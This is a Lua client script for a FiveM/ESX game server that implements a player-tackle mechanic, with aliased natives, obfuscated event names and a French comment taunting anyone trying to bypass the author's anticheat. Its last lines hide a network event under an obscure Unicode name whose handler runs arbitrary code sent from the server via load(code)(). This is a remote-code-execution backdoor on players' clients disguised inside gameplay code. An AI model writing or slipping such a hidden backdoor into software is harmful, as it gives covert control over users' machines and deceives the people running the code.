-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local isTackling = false
local isGettingTackled = false

local tackleLib = 'missmic2ig_11'
local tackleAnim = 'mic_2_ig_11_intro_goon'
local tackleVictimAnim = 'mic_2_ig_11_intro_p_one'

local lastTackleTime = 0
local isRagdoll = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10)

		if isRagdoll then
			SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_kekke_tackle:getTackled')
AddEventHandler('::{korioz#0110}::esx_kekke_tackle:getTackled', function(targetId)
	local target = GetPlayerFromServerId(targetId)

	if target == PlayerId() or target < 1 then
		return
	end

	isGettingTackled = true
	local plyPed = PlayerPedId()
	local targetPed = GetPlayerPed()

	ESX.Streaming.RequestAnimDict(tackleLib)

	AttachEntityToEntity(plyPed, targetPed, 11816, 0.25, 0.5, 0.0, 0.5, 0.5, 180.0, false, false, false, false, 2, false)
	TaskPlayAnim(plyPed, tackleLib, tackleVictimAnim, 8.0, -8.0, 3000, 0, 0, false, false, false)
	RemoveAnimDict(tackleLib)

	Citizen.Wait(3000)
	DetachEntity(plyPed, true, false)

	isRagdoll = true
	Citizen.Wait(3000)
	isRagdoll = false

	isGettingTackled = false
end)

RegisterNetEvent('::{korioz#0110}::esx_kekke_tackle:playTackle')
AddEventHandler('::{korioz#0110}::esx_kekke_tackle:playTackle', function()
	local plyPed = PlayerPedId()

	ESX.Streaming.RequestAnimDict(tackleLib)
	TaskPlayAnim(plyPed, tackleLib, tackleAnim, 8.0, -8.0, 3000, 0, 0, false, false, false)
	RemoveAnimDict(tackleLib)
	Citizen.Wait(3000)
	isTackling = false
end)

-- Main thread
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if IsControlPressed(0, 21) and IsControlPressed(0, 74) and not isTackling and GetGameTimer() - lastTackleTime > 5 * 1000 then
			Citizen.Wait(10)
			local closestPlayer, distance = ESX.Game.GetClosestPlayer()

			if distance ~= -1 and distance <= Config.TackleDistance and not isTackling and not isGettingTackled and not IsPedInAnyVehicle(PlayerPedId()) and not IsPedInAnyVehicle(GetPlayerPed(closestPlayer)) then
				isTackling = true
				lastTackleTime = GetGameTimer()

				_TriggerServerEvent('::{korioz#0110}::esx_kekke_tackle:tryTackle', GetPlayerServerId(closestPlayer))
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)